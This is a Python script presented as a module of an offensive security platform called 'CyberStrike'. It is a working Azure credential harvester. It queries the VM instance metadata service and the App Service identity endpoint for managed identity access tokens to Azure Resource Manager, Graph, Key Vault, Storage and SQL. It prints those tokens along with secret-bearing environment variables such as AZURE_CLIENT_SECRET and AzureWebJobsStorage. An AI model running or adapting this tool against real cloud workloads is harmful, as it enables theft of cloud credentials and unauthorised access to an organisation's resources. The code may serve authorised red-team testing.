#!/usr/bin/env python3
"""
managed_identity.py — Azure Managed Identity Token Extraction

Extracts managed identity tokens from Azure VM IMDS, App Service,
and Azure Functions environments.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)

IMDS_URL = "http://169.254.169.254/metadata"
IDENTITY_URL = "http://169.254.169.254/metadata/identity/oauth2/token"
APP_SERVICE_MSI = os.environ.get("IDENTITY_ENDPOINT", "")
APP_SERVICE_HEADER = os.environ.get("IDENTITY_HEADER", "")


class ManagedIdentityHarvester:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Azure Managed Identity Harvester")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            source = record.get("source", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{source.upper():<14}] [{status.upper():<8}] {detail}", flush=True)

    def harvest_vm_imds(self):
        if not self.running:
            return

        try:
            r = requests.get(
                f"{IMDS_URL}/instance?api-version=2021-02-01",
                headers={"Metadata": "true"},
                timeout=2,
            )
            if r.status_code == 200:
                instance = r.json()
                compute = instance.get("compute", {})
                self.emit({
                    "source": "vm_imds",
                    "status": "info",
                    "detail": f"VM: {compute.get('name')} ({compute.get('vmId')})",
                    "vm_name": compute.get("name"),
                    "vm_id": compute.get("vmId"),
                    "location": compute.get("location"),
                    "vm_size": compute.get("vmSize"),
                    "subscription_id": compute.get("subscriptionId"),
                    "resource_group": compute.get("resourceGroupName"),
                    "os_type": compute.get("osType"),
                })
            else:
                self.emit({"source": "vm_imds", "status": "unavail", "detail": f"IMDS not available (HTTP {r.status_code})"})
                return
        except requests.exceptions.RequestException:
            self.emit({"source": "vm_imds", "status": "unavail", "detail": "IMDS not reachable"})
            return

        resources = [
            ("https://management.azure.com/", "ARM"),
            ("https://graph.microsoft.com/", "Graph"),
            ("https://vault.azure.net", "KeyVault"),
            ("https://storage.azure.com/", "Storage"),
            ("https://database.windows.net/", "SQL"),
        ]

        for resource, label in resources:
            if not self.running:
                break
            try:
                r = requests.get(
                    IDENTITY_URL,
                    headers={"Metadata": "true"},
                    params={"api-version": "2018-02-01", "resource": resource},
                    timeout=5,
                )
                if r.status_code == 200:
                    token_data = r.json()
                    self.emit({
                        "source": "vm_imds",
                        "status": "success",
                        "detail": f"Token for {label} ({resource})",
                        "resource": resource,
                        "label": label,
                        "access_token": token_data.get("access_token"),
                        "token_type": token_data.get("token_type"),
                        "expires_on": token_data.get("expires_on"),
                        "client_id": token_data.get("client_id"),
                    })
                else:
                    self.emit({"source": "vm_imds", "status": "denied", "detail": f"{label}: HTTP {r.status_code}"})
            except requests.exceptions.RequestException as e:
                self.emit({"source": "vm_imds", "status": "error", "detail": f"{label}: {e}"})

    def harvest_app_service(self):
        if not self.running:
            return
        if not APP_SERVICE_MSI:
            self.emit({"source": "app_service", "status": "unavail", "detail": "Not running in App Service (IDENTITY_ENDPOINT not set)"})
            return

        resources = [
            ("https://management.azure.com/", "ARM"),
            ("https://graph.microsoft.com/", "Graph"),
            ("https://vault.azure.net", "KeyVault"),
        ]

        for resource, label in resources:
            if not self.running:
                break
            try:
                r = requests.get(
                    APP_SERVICE_MSI,
                    headers={"X-IDENTITY-HEADER": APP_SERVICE_HEADER},
                    params={"api-version": "2019-08-01", "resource": resource},
                    timeout=5,
                )
                if r.status_code == 200:
                    token_data = r.json()
                    self.emit({
                        "source": "app_service",
                        "status": "success",
                        "detail": f"Token for {label}",
                        "resource": resource,
                        "label": label,
                        "access_token": token_data.get("access_token"),
                        "expires_on": token_data.get("expires_on"),
                        "client_id": token_data.get("client_id"),
                    })
                else:
                    self.emit({"source": "app_service", "status": "denied", "detail": f"{label}: HTTP {r.status_code}"})
            except requests.exceptions.RequestException as e:
                self.emit({"source": "app_service", "status": "error", "detail": f"{label}: {e}"})

    def harvest_env_vars(self):
        if not self.running:
            return
        interesting = [
            "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
            "AZURE_SUBSCRIPTION_ID", "AZURE_AUTHORITY_HOST",
            "MSI_ENDPOINT", "MSI_SECRET", "IDENTITY_ENDPOINT", "IDENTITY_HEADER",
            "APPSETTING_WEBSITE_SITE_NAME", "WEBSITE_SITE_NAME",
            "FUNCTIONS_WORKER_RUNTIME", "AzureWebJobsStorage",
        ]
        found = {}
        for key in interesting:
            val = os.environ.get(key)
            if val:
                found[key] = val

        if found:
            self.emit({
                "source": "env_vars",
                "status": "info",
                "detail": f"Found {len(found)} Azure-related env vars",
                "variables": found,
            })
        else:
            self.emit({"source": "env_vars", "status": "info", "detail": "No Azure env vars found"})

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        self.harvest_vm_imds()
        self.harvest_app_service()
        self.harvest_env_vars()

        self.cleanup()

    def cleanup(self):
        print(f"\n--- managed_identity summary ---")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract managed identity tokens from Azure VM, App Service, and Functions.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 managed_identity.py\n"
            "  python3 managed_identity.py --json-output\n"
        ),
    )
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    harvester = ManagedIdentityHarvester(args)
    harvester.run()


if __name__ == "__main__":
    main()
